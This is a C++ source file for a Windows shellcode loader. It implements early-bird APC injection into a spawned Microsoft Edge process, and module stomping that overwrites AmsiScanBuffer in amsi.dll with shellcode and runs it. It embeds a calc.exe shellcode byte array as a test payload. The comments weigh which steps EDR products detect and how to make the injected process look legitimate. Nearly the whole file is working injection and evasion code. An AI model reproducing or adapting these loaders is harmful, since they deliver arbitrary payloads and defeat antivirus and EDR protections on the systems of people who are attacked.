#include <windows.h>
#include <iostream>
#include <vector>
BOOL EarlyBirdProcessInjectionW(IN LPWSTR szProcessImgNameAndParms, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PPROCESS_INFORMATION pProcessInfo) {

	//quick err handle
	if (!szProcessImgNameAndParms || !pShellcodeAddress || !sShellcodeSize || !pProcessInfo)
		return FALSE;

	STARTUPINFOW			StartupInfo = { 0 };
	PVOID					pBaseAddress = NULL;
	DWORD					dwCreationFlags = (DEBUG_ONLY_THIS_PROCESS | DETACHED_PROCESS),
		dwOldProtection = 0x00;
	SIZE_T					NumberOfBytesWritten = 0x00;

	//init structs...
	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));

	StartupInfo.cb = sizeof(STARTUPINFOW);

	//creating the new process, likely a detectino point
	/*
	BOOL CreateProcessW(
	  [in, optional]      LPCWSTR               lpApplicationName,
	  [in, out, optional] LPWSTR                lpCommandLine,
	  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
	  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
	  [in]                BOOL                  bInheritHandles,
	  [in]                DWORD                 dwCreationFlags,
	  [in, optional]      LPVOID                lpEnvironment,
	  [in, optional]      LPCWSTR               lpCurrentDirectory,	//set dur that process uses. Could be useful for mkaing the process look legit. NULL copies the parent. For edge, the edge dir may be a good idea. for svchost, C:\Windows\System32, etc. 
	  [in]                LPSTARTUPINFOW        lpStartupInfo,
	  [out]               LPPROCESS_INFORMATION lpProcessInformation
	);
	
	*/
	if (!CreateProcessW(NULL, szProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessW Failed with Error: %d \n", GetLastError());
		return FALSE;
	}


	//LPVOID VirtualAllocEx(
	//	[in]           HANDLE hProcess,
	//	[in, optional] LPVOID lpAddress,
	//	[in]           SIZE_T dwSize,
	//	[in]           DWORD  flAllocationType, // could get interesting and use MEM_TOP_DOWN which finds the highest mem address. Just switches up behaviour a bit
	//	[in]           DWORD  flProtect
	//);
	//allocate memory into said process, 100% a detection point
	if (!(pBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, NULL, sShellcodeSize, MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE))) {
		printf("[!] VirtualAllocEx Failed with Error: %d \n", GetLastError());
		return FALSE;
	}

	//write memory into said process, 100% a detection point
	if (!WriteProcessMemory(pProcessInfo->hProcess, pBaseAddress, pShellcodeAddress, sShellcodeSize, &NumberOfBytesWritten) || sShellcodeSize != NumberOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
		printf("[!] Wrote %d Of %d Bytes\n", (int)NumberOfBytesWritten, (int)sShellcodeSize);
		return FALSE;
	}

	//set mem to PAGE_EXECUTE_READWRITE, HUGE flag holy fuck. just do PAGE_EXECUTE (works)
	if (!VirtualProtectEx(pProcessInfo->hProcess, pBaseAddress, sShellcodeSize, PAGE_EXECUTE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	//PAPCFUNC, is same trick as with threads, basicallyjust case the shellcode into it and windows handles it
	if (!QueueUserAPC((PAPCFUNC)pBaseAddress, pProcessInfo->hThread, NULL)) {
		printf("[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	//stopps debugger, which i think resumes the process we created. 
	if (!DebugActiveProcessStop(pProcessInfo->dwProcessId)) {
		printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

//get elastic spun up to test this again... lots of ways to do this

/*
* Local options: (warning, if shellcode has an exit, these break. Probably best to thread this and have siad shellcode have a thread exit)
* 
Function Stomp: Overwrite a functin in the dll. Stays backed, does not fuck up headers. Could break if other parts of softwware try to access said funcs

General Stomp: Overwrite EVERYTHING in the module, which is bad, cuz it nukes the "mz...." which may be used by EDR's to detect backed mem or not. 

.text stomp (trad): Find .text section through some parsing magic, and overwrite that



*/
int local_stomp(std::vector<uint8_t> shellcode) {
	/*
	quick attempt to mod stomp	


	just realized this is loading it into our process, not the remote one. whatever we'll see what happens.
	*/
	//load our legitish looking dll. HMDOULE is addr its at
	HMODULE loaded_dll_addr = LoadLibraryA("amsi.dll");
	std::cout << "Base Address: 0x" << std::hex << loaded_dll_addr << std::endl;

	//Note: can just overwrite one function too, but that might be size cosntrained. It appears more legit, as the headers are kept intact too
	FARPROC loaded_dll_func_address = GetProcAddress(loaded_dll_addr, "AmsiScanBuffer");
	std::cout << "AmsiScanBuffer Address: 0x" << std::hex << loaded_dll_func_address << std::endl;


	//change addr so we can write that section
	DWORD old_protect;
	VirtualProtect(loaded_dll_func_address, shellcode.size(), PAGE_EXECUTE_READWRITE, &old_protect);

	//write to it, can just memcpy cuz it's in our process I guess. 
	memcpy(loaded_dll_func_address, shellcode.data(), shellcode.size());

	//execute inline with backed
	((void(*)())loaded_dll_func_address)();
	//write shellcode
	return 0;
}

int main() {
	//path of the exe to spawn
	//stupid hacky way to deal with dynamic strings of a path, etc. 
	//std::wstring path = L"C:\\Windows\\System32\\cmd.exe PAUSE";
	//trying edge cuz that's commonly opened by people
	std::wstring path = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
	// Create a vector including the null terminator
	std::vector<wchar_t> processBuf(path.begin(), path.end());
	processBuf.push_back(L'\0');

	//declare shellcode
	//shellcode for calc
	//would substitute in the * deref here.
	std::vector < uint8_t> not_shellcode = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 
		0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
		0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 
		0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 
		0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 
		0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 
		0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 
		0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 
		0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 
		0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 
		0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 
		0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 
		0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };

	local_stomp(not_shellcode);

	//try executing locally


	//PPROCESS_INFORMATION
	//PROCESS_INFORMATION pi = { 0 }; // Create the actual object

	//BOOL result = EarlyBirdProcessInjectionW(
	//	processBuf.data(),
	//	not_shellcode.data(),
	//	not_shellcode.size(),
	//	&pi

	//);

	//if (result == FALSE) {
	//	std::cout << "Injection failed" << std::endl;
	//}

}